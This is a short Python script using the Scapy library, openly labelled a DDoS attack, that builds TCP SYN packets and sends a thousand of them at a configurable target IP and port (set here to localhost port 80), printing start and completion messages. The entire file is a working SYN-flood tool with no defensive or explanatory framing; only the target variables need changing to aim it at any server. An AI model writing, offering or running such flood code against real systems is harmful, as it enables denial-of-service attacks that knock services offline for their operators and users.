from scapy.all import IP, TCP, send

target_ip = "127.0.0.1"
target_port = 80
attack_duration = 10  # in seconds
attack_rate = 100  # packets per second

def perform_ddos():
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    send(packet, count=attack_rate*attack_duration, verbose=False)

if __name__ == "__main__":
    print("Starting DDoS attack...")
    perform_ddos()
    print("Attack completed.")
